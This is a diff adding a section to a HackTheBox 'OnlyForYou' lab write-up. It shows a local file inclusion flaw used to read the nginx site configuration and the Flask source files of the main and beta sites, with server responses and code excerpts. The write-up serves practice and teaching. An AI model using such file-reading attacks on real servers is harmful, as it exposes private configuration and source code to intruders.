@@ -110,4 +110,79 @@ def download():
 Exploiting this is just too easy, it just needs to be an absolute path and the application will happily provide any file as long as it exists.
 ![Directory Traversal 1](https://github.com/e-war/Writeups/blob/master/HackTheBox/OnlyForYou/Screenshots/directory_traversal1.png)
 
+So 2 users we may need to look out for being John and Dev
 
+## LFI Vulnerability
+Using the Local File Inclusion vulnerability, i searched for default configuration files, knowing the site was hosted on NGINX, i searched
+`/etc/nginx/nginx.conf` which didn't give anything useful, checking `/etc/nginx/sites-enabled/default` however...
+
+```
+server {
+    listen 80;
+    return 301 http://only4you.htb$request_uri;
+}
+
+server {
+	listen 80;
+	server_name only4you.htb;
+
+	location / {
+                include proxy_params;
+                proxy_pass http://unix:/var/www/only4you.htb/only4you.sock;
+	}
+}
+
+server {
+	listen 80;
+	server_name beta.only4you.htb;
+
+        location / {
+                include proxy_params;
+                proxy_pass http://unix:/var/www/beta.only4you.htb/beta.sock;
+        }
+}
+```
+
+which led me to perform the same LFI on `/var/www/beta.only4you.htb/app.py` to see if we recieved the source code as expected...
+```
+HTTP/1.1 200 OK
+Server: nginx/1.18.0 (Ubuntu)
+Date: Sat, 29 Apr 2023 18:31:20 GMT
+Content-Type: text/x-python; charset=utf-8
+Content-Length: 4551
+Connection: close
+Content-Disposition: attachment; filename=app.py
+Last-Modified: Sun, 11 Dec 2022 13:25:09 GMT
+Cache-Control: no-cache
+ETag: "1670765109.8359272-4551-3480357964"
+
+from flask import Flask, request, send_file, render_template, flash, redirect, send_from_directory
+import os, uuid, posixpath
+from werkzeug.utils import secure_filename
+from pathlib import Path
+from tool import convertjp, convertpj, resizeimg
+
+app = Flask(__name__)
+app.secret_key = uuid.uuid4().hex
+...
+```
+I perform the same on the main page, stands to reason that the developer used the same python backend to host both, so i did the same on `/var/www/only4you.htb/app.py` ...
+```
+from flask import Flask, render_template, request, flash, redirect
+from form import sendmessage
+import uuid
+
+app = Flask(__name__)
+app.secret_key = uuid.uuid4().hex
+
+@app.route('/', methods=['GET', 'POST'])
+def index():
+    if request.method == 'POST':
+        email = request.form['email']
+        subject = request.form['subject']
+        message = request.form['message']
+        ip = request.remote_addr
+        status = sendmessage(email, subject, message, ip)
+...
+```
+This seems to be what controls that email form previously seen, i also attempted to see if this `form` import is also locally included in this directory. `/var/www/only4you.htb/form.py`
